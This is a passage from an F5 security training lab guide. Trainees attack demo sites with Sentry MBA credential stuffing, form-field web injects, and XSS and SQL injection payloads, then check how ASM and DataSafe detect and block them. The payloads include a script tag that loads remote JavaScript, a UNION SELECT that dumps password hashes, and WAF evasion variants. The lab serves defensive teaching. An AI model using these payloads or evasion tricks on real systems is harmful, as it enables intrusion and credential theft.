logins were successful for both **admin:admin** and **user1:user1**..

-  Once you see the successful logins for **admin:admin** and
   **user1:user1**, click **Abort**, and then click **Stop**.

Food for Thought:

| Even though we have distributed brute force protection enabled, this
  attack was still successful for the **admin** and **user1** accounts.
  Why?
| \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

-  From the left menu select **History > History**.

-  Right-click on the entry for **admin:admin** and select **Launch in
   Browser**, and then click **Yes**.

It’s very easy to use Sentry MBA to use, find, and exploit stolen
credentials.

-  Close the browser.

-  In Sentry MBA on the **History** page, click the delete icon, then
   select **Clear List**, and then click **Yes**.

   |image40|

Task 5– Review Requests in the ASM Log
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  In the Configuration Utility, on the **Application > Requests** page
   select **Refresh**.

There are many legal requests from different IP addresses for the
**[HTTP] /user/login** page.

-  Select several of the log entries and then examine the **Username**
   values on the **All Details** page.

-  Select the checkbox to select all the log entries, and then click
   **Delete Request > Delete all requests**.

Task 6– Review the Brute Force Log
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  | Navigate to **Security > Application Security > Event Logs >
     Application** and right-click
   | on **Brute Force Attacks**, and then select **Open Link in New
     Tab**.

-  In the new tab select the current ongoing attack until the **Login
   Stress** details displays.

In the left panel list is the list of attacks, including the current
ongoing attack. In the details panel is the login stress. This is based
on the number of failed logins detected compared to the set threshold.

-  Select the current ongoing attack until the **Attack Summary**
   details displays.

On this page there is extensive details about the attack, including the
attack type, detected failed logins, detected login attempts, and the
mitigation method.

-  Scroll down to view additional mitigation statistics, such as total
   mitigated login attempts, total CAPTCHA challenges, and total
   blocking page responses.

-  Select the different tabs at the top of the page to see additional
   details about the attack.

Food for Thought:

| Why are there no Mitigated Device IDs? How was ASM able to collect and
  list the usernames attempted? Why are there no Known Leaked
  Credentials?
| \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

Task 6– Access from a browser
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  Test that even under attack when ASM blocks malicious traffic, normal
   users are able to access the login page.

-  ASM stores the client ip for every request it challenge. We are using
   an irule to rotate the ip addresses, so in order to test normal user
   - remove the irule from the virtual server.

-  Remove the ‘rule\_insert-XFF’ iRule from
   Hackazone\_protected\_virtual virtual server

-  Open a new chrome browser and login using user1 as username and user1
   as password.

-  Apply the ‘rule\_insert-XFF’ to the Hackazone\_protected\_virtual
   virtual server

Exercise 5 – Blocking a Credential Stuffing Attack
==================================================

Task 1 – Enable Credential Stuffing Protection
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  In the **Brute Force Attack Prevention** tab click **[HTTP]
   /user/login**.

-  In the **Distributed Brute Force Protection** section, for **Detect
   Credential Stuffing** select the **After** option and use **20**
   login attempts that match known leaked credentials dictionary.

   |image41|

-  Click **Save**, then click **Apply Policy** and then **OK**.

Task 2 – Launch a Distributed Attack
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  In **Sentry MBA** click **Go**.

-  Select the **Reset WordList Position** checkbox.

-  Click **Start the Bruteforcer Engine!**

The attack starts, but this time there are no results in the **Hits**
tab.

Question:

Why were there no successful logins found?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

-  After ten seconds or so, click **Abort**, and then click **Stop**,
   and then close **Sentry MBA**.

Task 3 – Review the Brute Force Log
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  In the Configuration Utility, in the **Brute Force Attacks** tab
   reload the page.

   |image42|

Notice the new ongoing attack is listed as **Credentials Stuffing**.

-  | Select the current ongoing attack and view the **Attack Summary**,
     **Mitigated IP Addresses**, and
   | **Mitigated Usernames** tabs.

-  Open the **Known Leaked Credentials** tab.

Question:

How many times were the first ten usernames attempted?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

Note that the logins failed. This is only because they were not valid
credentials for this website. IF they had ben valid credentials they
would have succeeded with any of the first 20 login attempts.

Question:

| Why is the **Failed Logins** result of all the subsequent login
  attempts “N/A”?
| \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

Hint: What is our mitigation method?

-  Close the **Brute Force Attacks** tab

Lab 4 – Protecting Credentials with F5 DataSafe

The purpose of this lab is to show the new DataSafe implementation in
13.1. You will review the login page with and without DataSafe
protections. You will enable and test encryption, obfuscation, and decoy
fields.

Exercise 1 – Review and Attack the Login Page
=============================================

Task 1 – Review Form Fields with the Developer Tools
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**→NOTE:** Ensure Burp Suite is still running and set to **Intercept is
off**.

-  Open Firefox and access http://hackazon.f5demo.com/user/login.

-  Right-click inside the **Username or Email** field and select
   **Inspect Element**.

Question:

What is the **name** value for this field?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

-  Right-click inside the **Password** field and select **Inspect
   Element**.

Question:

What is the **name** value for this field?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

**FOOD FOR THOUGHT:** How difficult would it be for malware to know
which fields to grab to steal credentials from this page? How difficult
would it be for an attacker to stuff credentials into these fields? They
could simply put the stolen username into the “username” field and the
stolen password in the “password” field. This is what you did with the
Sentry MBA tool earlier in this lab.

Task 2 – Review Methods for Stealing Credentials
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  In the developer tools select the **Network** tab, then click the
   trash can icon to delete the requests.

-  On the login page enter your first name as username and **P@ssw0rd!**
   as password and click **Sign In**.

**NOTE:** Your login will fail, but your credentials were still sent to
the web server.

-  In the **Network** tab select the **/login?return\_url=** entry, and
   then examine the **Params** tab.

   |image43|

The user’s credentials are visible in clear text.

This is another way that malware can steal credentials. By “grabbing”
the POST request and any data sent with it, including username and
password.

Task 3 – Perform a Form Field “Web Inject”
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  Return to the http://hackazon.f5demo.com/user/login page.

**NOTE:** It should NOT have **?return\_url=** at the end of the URL in
the address bar.

-  Right-click inside the **Username or Email** field and select
   **Inspect Element** again.

-  Right-click on the highlighted text and select **Edit as HTML**.

   |image44|

-  Select all the text in the window and type **Ctrl+C** to copy the
   text.

-  Click after the end of **type="text">** and type **<br>**, and then
   press the **Enter** key twice.

-  Type **Ctrl+V** to paste the copied text.

   |image45|

-  For the new pasted entry, change the **name**, **id**, and
   **data-by-field** values to **mobile**, and change the
   **placeholder** value to **Mobile Phone Number**.

   |image46|

-  Click outside of the edit box and examine the Hackazon login page.

This is an example of the type of “web injects” that malware can perform
to collect additional information. This same technique could be used to
remove text or form fields. Note that this was done on the client side,
in the browser, without any requests being sent to the server. The web
application and any security infrastructure protecting it would have no
idea this is happening in the browser.

-  Close Firefox.

Exercise 2 – Review and Configure DataSafe Components
=====================================================

Task 1 – DataSafe Licensing and Provisioning
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  In the Configuration Utility, open the **System > License** page.

   |image47|

DataSafe includes only the Application Layer Encryption (ALE) module of
WebSafe. Unlike WebSafe, DataSafe is licensed perpetually per device,
just like ASM, APM, or any other licensed module. DataSafe is NOT
included in the Best Bundle.

-  Open the **System > Resource Provisioning** page.

   |image48|

When DataSafe is licensed, **Fraud Protection Service (FPS)** will
display as **Licensed**.

This is different than WebSafe, where Fraud Protection Services will
show up as N/A.

|image49|

-  Expand the **Security** menu.

| There is a **Data Protection** option. This is different than WebSafe
  where this menu option is
| **Fraud Protection Service**.

**DataSafe**

|image50|

**
**

Task 2 – DataSafe Configuration
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  Open the **Security > Data Protection > DataSafe Profiles** page and
   click **Create**.

-  For **Profile Name** enter **Hackazon-DS**.

-  On the left menu click **URL List**, and then click **Add**.

   |image51|

-  For **URL Path** leave **Explicit** selected, and type
       **/user/login**.

-  From the left panel open the **Parameters** page.

Remember from earlier you found that the username and password parameter
names are **username** and **password**.

-  Create a new parameter named **username**, and then click **Add**.

-  Create a second parameter named password, and then click **Add**.

-  Scroll to the right to view all the parameter options.

-  For the **username** parameter select the **Obfuscation** checkbox.

-  For the **password** parameter select the **Encrypt**, **Substitute
       Value**, and **Obfuscate** checkboxes.

   |image52|

-  Scroll to the left, and from the left menu open the **Application
   Layer Encryption** page.

Notice that most features are enabled by default.

-  Review the explanations for the different features.

-  Select the **Add Decoy Inputs** and **Remove Element IDs**
   checkboxes, and then click **Create**.

   |image53|

-  Open the **Virtual Server List** page and click
   **Hackazon\_protected\_virtual**, and then open the virtual server
   **Security > Policies** page.

-  From the **Anti-Fraud Profile** list select **Enabled**.

-  From the **Profile** list box, select **Hackazon-DS**, and then click
   **Update**.

   |image54|

Exercise 3 – Testing DataSafe Protection
========================================

Task 1 – Review the Protected Hackazon Login Page
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  Open a **private** Firefox window and access
   http://hackazon.f5demo.com/user/login.

-  Right-click inside the **Password** field and select **Inspect
   Element**.

Question:

What is the **name** value for this field?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

|image55|

**Obfuscation** - Notice that the name of the password field (outlined
in red) is now a long cryptic name and is changing every second. The
same is true of the username field.

**Add Decoy Inputs** – Notice that there are other random inputs being
added (outlined in green). The number and order of these inputs is
changing frequently.

**FOOD FOR THOUGHT:** Considering this obfuscation and you earlier
review of the Sentry MBA tool, do you think DataSafe could protect the
login page from a credential stuffing tool like Sentry MBA?

-  In the developer tools window select the **Network** tab, then click
   the trash can icon to delete any current requests.

-  On the login page enter your first name as username and **P@ssw0rd!**
   as password and click **Sign In**.

-  In the **Network** tab select the **/login?return\_url=** entry, and
   then examine the **Params** tab.

Questions:

What parameters were submitted?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

Do you see a username or password field?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

Do you see the username you submitted?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

**Obfuscation** – DataSafe obfuscates the names of the parameters when
they are submitted in a login request.

**Encryption** – DataSafe encrypted the value of the password field so
that it is not a readable value in the login request.

These two features together protect the credentials from being stolen by
malware “POST grabbers”.

Exercise 4 – ASM Compatibility
==============================

Task 1 – Review the ASM Request Event Log
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  In the Configuration Utility, open the **Security > Event Logs >
   Application** page clear the filter by clicking on the **X** next to
   **Illegal Requests**.

-  Find the most recent request for **[HTTP] /user/login** and select
   it.

-  Click **All Details**.

Question:

Was ASM able to capture the username while the field name was
obfuscated? \_\_\_\_\_\_\_\_\_\_

-  In the **Request** section examine the POST parameter values.

   |image56|

The POST request was first handled by DataSafe and the parameters names
were de-obfuscated and decrypted before being handed off to ASM.

DataSafe is FULLY compatible with ASM on the same virtual server!

Optional Lab 1 – Evasion Techniques

The purpose of this lab is to introduce common penetration testing
techniques and show how ASM signatures, normalization engine, and
protocol validation handle evasion techniques. You will also use Burp
Suite to view, manipulate, and replay requests and attacks.

Exercise 1 – Setup and Determining Vulnerability 
=================================================

Task 1 – Determining Cross Site Scripting (XSS) Vulnerabilities
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**→NOTE:** Ensure Burp Suite is still running and set to **Intercept is
off**.

-  Open Firefox window and access http://unprotected.f5demo.com and log
       in as **admin** / **password**.

-  On the navigation menu, click **XSS (Reflected)**.

-  Type your first name into the field, and then click **Submit**.

Note that the name you entered is shown in the response. This is known
as “reflection”; user input is shown, or reflected, in the response.

-  Copy and paste the following into the field, and then click
       **Submit**:

'';!--"<F5ROCKS>=&{()}

This is a common string used to test what, if any, filters and/or
encoding are being used on user input. Typically, the source of the page
after this injection will contain either &lt;XSS or <XSS. If the second
is found, the application is most likely not filtering user input (as it
allowed the addition of an arbitrary tag) and is likely vulnerable to
XSS.

Note that the visible response does not reflect the string “<F5ROCKS”
and does not APPEAR to show vulnerability. Let’s view the page source to
be sure.

-  Right-click on the page and select **View page source**.

-  Type **Ctrl+F** to open the inline search bar and search for
   **F5ROCKS**.

The presence of “<F5ROCKS” in the page source is an indicator that the
page is not filtering user input and is likely vulnerable to XSS.

-  Close the source page tab.

-  Click **Home**, and then click **XSS (Reflected)** again.

This is done to clear the previous attack string from the URL and thus
the referrer header on the subsequent request. This will help avoid
confusion when looking at the ASM request logs so that the same
signatures do not match for the next request

-  Copy and paste the following into the field, and then click
       **Submit**:

';alert(String.fromCharCode(88,83,83))//
";alert(String.fromCharCode(88,83,83))//
--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

| **';alert(String.fromCharCode(88,83,83))//
  **\ This injection attempts to terminate a JavaScript string literal
  (using '), then terminate the statement (with ;) and makes a call to
  alert(String.fromCharCode(88,83,83)) which will cause a popup box
  containing "XSS". The following // is an attempt to "comment out" the
  rest of the statement, so that a syntax error will not occur and the
  script will execute.
| **";alert(String.fromCharCode(88,83,83))// --
  **\ This injection is like the previous injection, but it uses " in an
  attempt to terminate a JavaScript string literal.
| **--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
  **\ This attempts to do the following things:
| \* Terminate an HTML (or XML) comment (with -->)
| \* Terminate an existing <SCRIPT> tag using </SCRIPT>
| \* This is done to prevent the injected script causing a syntax error,
  which would prevent the
| injected script from executing.
| \* Terminate an HTML attribute and tag, using ">
| \* Terminate an HTML attribute and tag, using '>
| \* Inject JavaScript using
  <SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>.

-  Click **Home**, and then click **XSS (Reflected)** again.

-  Copy and paste the following into the field, and then click
       **Submit**:

<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>

This is a standard JavaScript injection that is calling a remote .js
file.

-  Close Firefox.

Exercise 2 – Testing ASM with Evasion Techniques 
=================================================

Task 1 – Testing the Cross-Site Scripting through ASM
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  In the Configuration Utility, open the **Security > Event Logs >
   Application >** **Requests** page, and then clear the filter by
   clicking on the **X** next to **Illegal Requests**.

   |image57|

-  Select the checkbox to select all the log entries, and then click
   **Delete Requests > Delete all requests**.

-  | Open a new private Firefox window and access
         http://protected.f5demo.com and log in
       | as **admin** / **password**.

-  On the navigation menu, click **XSS (Reflected)**.

-  Copy and paste the following into the field, and then click
       **Submit**:

'';!--"<F5ROCKS>=&{()}

-  In the Configuration Utility, on the **Application > Requests** page
   select **Refresh**.

-  Select the log entry with the violation rating and click **Attack
   signature detected** to see which signatures were matched to trigger
   the violation rating.

-  Select the checkbox to select all the log entries, and then click
   **Delete Requests**.

-  In the DVWA page, click **Home**, and then click **XSS (Reflected)**
   again.

-  Copy and paste the following into the field, and then click
   **Submit**:

';alert(String.fromCharCode(88,83,83))//
";alert(String.fromCharCode(88,83,83))//
--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

-  In the Configuration Utility, on the **Application > Requests** page
   select **Refresh**.

-  Select the log entry with the violation rating and click **Attack
   signature detected** to see which signatures were matched to trigger
   the violation rating.

-  Select the checkbox to select all the log entries, and then click
   **Delete Requests**.

-  In the DVWA page, click **Home**, and then click **XSS (Reflected)**
   again.

-  Copy and paste the following into the field, and then click
       **Submit**:

<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>

-  In the Configuration Utility, on the **Application > Requests** page
   select **Refresh**.

-  Select the log entry with the violation rating and click **Attack
   signature detected** to see which signatures were matched to trigger
   the violation rating.

-  Select the checkbox to select all the log entries, and then click
   **Delete Requests**.

-  In the DVWA page, click **Home**, and then click **XSS (Reflected)**
   again.

Task 2 – Obfuscation – URL Encoding
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

One form of obfuscation is encoding the attack to “hide” it from
protections like IPS and WAF. In this step we will try URL-encoding.

-  In Burp Suite, click **Intercept is off** (ensure that it reads
   **Intercept is on**).

-  In Firefox click **Home**, and then in Burp Suite click **Forward**
   until the DVWA home page displays.

-  In the DVWA page copy and paste the following into the field, and
   then click **Submit**:

<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>

-  In Burp Suite select the entire parameter value (everything after the
   **=**), then right-click on the parameter value and select **Send to
   Decoder**.

   |image58|

-  Select the **Decoder** tab.

-  On the right-side of the page select **Encode as … > URL.**

   |image59|

-  Select the entire URL-encoded value (use **Ctrl+A**) and copy it (use
   **Ctrl+C**).

-  Select the **Proxy** tab.

-  Right-click on the selected parameter value and select **Paste** to
   replace it with the URL-encoded string.

-  Click **Forward** until the reflected response displays on the DVWA
   page.

-  In the Configuration Utility, on the **Application > Requests** page
   select **Refresh**.

-  | Select the log entry for **/vulnerabilities/xss\_r/** with the
     violation rating and click
   | **Attack signature detected** to see which signatures were matched
     to trigger the violation rating.

Questions:

Did encoding the XSS attack hide it from ASM?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

What does this tell you about encoded obfuscation?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

-  Select the checkbox to select all the log entries, and then click
   **Delete Requests**.

Task 3 – Obfuscation – String Manipulation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Another form of obfuscation is string manipulation. In this exercise, we
will try manipulating common XSS and SQLi attack strings to evade
signature-based detections.

Null character insertion

-  In Firefox click **Home**, and then in Burp Suite click **Forward**
   until the DVWA home page displays.

-  In Firefox click **XSS (Reflected)**, and then in Burp Suite click
   **Forward** until the XSS Reflected page displays.

-  Copy and paste the following into the field, and then click
   **Submit**:

<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>

-  In Burp Suite insert a URL-encoded null character (**%00**) in the
   middle of the first and last SCRIPT tags (i.e. **SCR%00IPT**).

   |image60|

-  Click **Forward** until the dialog box displays on the DVWA page.

-  In the Configuration Utility, on the **Application > Requests** page
   select **Refresh**.

-  | Select the log entry for **/vulnerabilities/xss\_r/** with the
     violation rating and click
   | **Attack signature detected** to see which signatures were matched
     to trigger the violation rating.

Question:

Did encoding the XSS attack hide it from ASM?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

-  Select the checkbox to select all the log entries, and then click
   **Delete Requests**.

SQLi always true

You should be familiar with the common “OR 1=1” SQLi injection attack.
This is a common attack that attempts to create an “always true”
condition that will cause the database to return more rows than the
application intended.

-  In Burp Suite, click **Intercept is on** (ensure that it reads
   **Intercept is off**).

-  On the DVWA page click **DVWA Security**.

-  Change the security level to **Low**, and then click **Submit**.

-  Click **SQL Injection**.

-  Copy and paste the following into the field, and then click
   **Submit**:

' OR 1=1#

-  In the Configuration Utility, on the **Application > Requests** page
   select **Refresh**.

-  | Select the log entry for **/vulnerabilities/sqli/** with the
     violation rating and click
   | **Attack signature detected** to see which signatures were matched
     to trigger the violation rating.

-  Select the checkbox to select all the log entries, and then click
   **Delete Requests**.

-  In the DVWA page, click **Home**, and then click **SQL Injection**
   again.

-  Copy and paste this less obvious “always true” string into the field,
   and then click **Submit**:

' OR ASCII('\*')>'40

This is essentially comparing the ASCII representation of the asterisk
(\*) character (which is 42) with the decimal number 40. Note we used a
greater than comparison rather than an equality comparison.

-  In the Configuration Utility, on the **Application > Requests** page
   select **Refresh**.

-  | Select the log entry for **/vulnerabilities/sqli/** with the
     violation rating and click
   | **Attack signature detected** to see which signatures were matched
     to trigger the violation rating.

Questions:

Are the signature IDs the same as the previous request?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

| What does this tell you about ASM signatures and the normalization
  engine
| \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

-  Select the checkbox to select all the log entries, and then click
   **Delete Requests**.

SQLi union select

In this exercise we will try a more sinister union select command that
returns all the usernames and their hashed passwords. We will then try
to manipulate the command to evade signature detection.

-  In the DVWA page, click **Home**, and then click **SQL Injection**
   again.

-  Copy and paste the following into the field, and then click
   **Submit**:

' and 1=0 union select null,
concat(first\_name,0x0a,last\_name,0x0a,user,0x0a,password) from users #

-  In the Configuration Utility, on the **Application > Requests** page
   select **Refresh**.

-  | Select the log entry for **/vulnerabilities/sqli/** with the
     violation rating and click
   | **Attack signature detected** to see which signatures were matched
     to trigger the violation rating.

-  Select the checkbox to select all the log entries, and then click
   **Delete Requests**.

-  In the DVWA page, click **Home**, and then click **SQL Injection**
   again.

-  Copy and paste this less obvious “always true” string into the field,
   and then click **Submit**:

' and 1=0 un/\*\*/ion/\*\*/sel/\*\*/ect null,
concat(first\_name,0x0a,last\_name,0x0a,user,0x0a,password) from users #

This string is trying to hide the union select command by inserting SQL
comments between and in the middle of the words.

-  In the Configuration Utility, on the **Application > Requests** page
   select **Refresh**.

-  | Select the log entry for **/vulnerabilities/sqli/** with the
     violation rating and click
   | **Attack signature detected** to see which signatures were matched
     to trigger the violation rating.

-  Select the checkbox to select all the log entries, and then click
   **Delete Requests**.

-  In the DVWA page, click the **Back** button, then click **Home**, and
   then click **SQL Injection** again.

-  Copy and paste this less obvious “always true” string into the field,
   and then click **Submit**:

' and 1=0 REVERSE(noinu) REVERSE(tceles) null,
concat(first\_name,0x0a,last\_name,0x0a,user,0x0a,password) from users #

This string is trying to hide the union select command by using the SQL
REVERSE function.

-  Close Firefox.

-  In the Configuration Utility, on the **Application > Requests** page
   select **Refresh**.

-  | Select the log entry for **/vulnerabilities/sqli/** with the
     violation rating and click
   | **Attack signature detected** to see which signatures were matched
     to trigger the violation rating.

-  Select the checkbox to select all the log entries, and then click
   **Delete Requests**.

Optional Lab 2 – Protecting JSON Applications

The purpose of this lab is to show ASM’s ability to parse and protect
JSON data.

Exercise 1 – Review the JSON Application 
=========================================

Task 1 – Review the JSON POST in Burp Suite
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**→NOTE:** Ensure Burp Suite is still running and set to **Intercept is
off**.

-  Open Firefox window and access http://simplestoref.f5demo.com and
       click **Login**.

   |image61|

We will now use Burp Suite to intercept, view, and manipulate the POSTs
to the login page.

-  In Burp Suite, click **Intercept is off** (ensure that it reads
   **Intercept is on**).

-  On the Simple Store page log in as **user** / **user** and click
       **Sign in**.

-  View the request in Burp Suite.

Notice that the POST data is not in typical key / value pairs. The POST
data is in JSON format. Also, the **Content-Type** is “\ **application/
json;charset=utf-8**\ ”.

-  Click **Forward**.

Exercise 2 – Manipulate JSON Request Data 
==========================================

Task 1 – Change Credentials using Burp Suite
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  On the Simple Store page log in as **user** / **user** and click
       **Sign in**.

-  In Burp Suite right-click on the request and select **Send to
   Repeater**.

   |image62|

In Burp Repeater we can manipulate and resend this request many times
and see the responses.

-  Select the **Repeater** tab.

-  Change the username and password JSON parameter values to **test** /
   **test**.

-  Click **Go**.

-  Examine the **Response**.

   |image63|

The response identifies that we successfully logged into the application
using the manipulated credentials.

Task 2 – Using SQL Injection in the JSON Values
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  Change the username JSON parameter value to **' OR 1=1#** and then
   click **Go**.

By examining the response, it appears that the page is isn’t susceptible
to this specific SQL injection attack. However, the application did
receive the request and try to process the JSON parameters.

A WAF will not be able to apply signatures to these parameter names and
values and protect this application unless it is able to properly parse
the JSON format and differentiate between the parameter name and the
parameter value.

Exercise 3 – Blocking Malicious JSON
====================================

Task 1 – Create a Security Policy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  In the Configuration Utility, open the **Security > Application
       Security > Security Policies > Policy List** page and click
       **Create New Policy**, and then select the **Advanced** settings.

-  Use the following information for the new policy, and then click
       **Create Policy**.

+--------------------------------------------------------+------------------------+
| **Policy Name**                                        | JSON-policy            |
+========================================================+========================+
| **Policy Template**                                    | Rapid Deployment       |
+--------------------------------------------------------+------------------------+
| **Virtual Server**                                     | JSON\_virtual (HTTP)   |
+--------------------------------------------------------+------------------------+
| **Enforcement Mode**                                   | Blocking               |
+--------------------------------------------------------+------------------------+
| **Application Language**                               | Unicode (utf-8)        |
+--------------------------------------------------------+------------------------+
| **Policy is Case Sensitive**                           | Disabled               |
+--------------------------------------------------------+------------------------+
| **Differentiate between HTTP/WS and HTTPS/WSS URLs**   | Disabled               |
+--------------------------------------------------------+------------------------+

Note that we did NOT make any JSON-specific changes to the policy.

Task 1 – Retry SQL Injection
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  In Burp Suite click **Go** to resend the request with the SQL
   injection attempt, and then examine the response.

   |image64|

Questions:

| What information in the response tells us that an ASM policy is
  applied?
| \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

Was the SQL injection attempt blocked by ASM?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

Why or why not?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

-  In the Configuration Utility, open the **Security > Event Logs >
   Application >** **Requests** page, and then clear the filter by
   clicking on the **X** next to **Illegal Requests**.

-  For the **/api/v1/login** log entry, click **Attack signature
   detected**.

Question:

What signatures were matched for this request?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

ASM could parse the JSON parameters and identify the request as
malicious. However, it did not block the request because the signatures
are in staging.

-  Select the checkbox to select all the log entries, and then click
   **Delete Requests**.

Exercise 4 – ASM Content Profiles
=================================

Task 1 – Review the JSON Content Profile
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  In the Configuration Utility, navigate to **Security > Application
       Security > Content Profiles** and then right-click on **JSON**,
       and then select **Open Link in New Tab**..

-  Click **Default**.

   |image65|

The default JSON profile allows ASM to validate JSON format and check
the parameter names and values against signatures.

Task 2 – Enforce Signatures and Re-attempt the SQL Injection Attack
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  Open the **Security > Application Security > Traffic Learning** page.

-  Expand the **Enforcement Readiness Summary** section.

-  Click the number indicating the number of signatures that are **Not
       Enforced And Have Suggestions**.

   |image66|

-  On the **Attack Signatures** page, select the checkboxes for the
       three signatures, and then click **Enforce** and then **OK**,
       then click **Apply Policy** and then **OK**.

-  In Burp Suite click **Go** to resend the request with the SQL
   injection attempt, and then examine the response.

Question:

Was the SQL injection attempt blocked by ASM?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

-  In the Configuration Utility, on the **Security > Event Logs >
   Application >** **Requests** tab refresh the page.

-  Select the blocked **/api/v1/login** log entry and examine the log
   details.

-  Select the checkbox to select all the log entries, and then click
   **Delete Requests**.

Exercise 5 – JSON Format Validation
===================================

Task 1 – Review the JSON Content Profile
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  In Burp Suite, change the username JSON parameter value to the
   following, and then click **Go**.

<script>window.alert("You have been hacked!!!");</script>

Question:

Was the request blocked? \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

-  In the Configuration Utility, on the **Security > Event Logs >
   Application >** **Requests** tab refresh the page.

-  Select the blocked **/api/v1/login** log entry.

<script>window.alert("You have been hacked!!!");</script>

Question:

Besides the signature violation, what other violation(s) were matched?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

Not only were the XSS signatures matched but ASM is also validating
correct JSON formatting. This “positive security model” function would
help catch zero-day or obfuscated attacks that may NOT trigger a
signature.

-  Select the checkbox to select all the log entries, and then click
   **Delete Requests**.

Optional Lab 3 – Cross Site Request Forgery Protection

The purpose of this lab is to show in detail how ASM mitigates CSRF
attacks. You will perform a CSRF attack and compare how requests and
responses differ with and without ASM protection.

Exercise 1 – Review the CSRF Attack Page 
=========================================

Task 1 – Attempt a CSRF Attack on the Unprotected Web Site
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**→NOTE:** Ensure Burp Suite is still running and set to **Intercept is
off**.

-  Open Firefox and access http://unprotected.f5demo.com and log in as
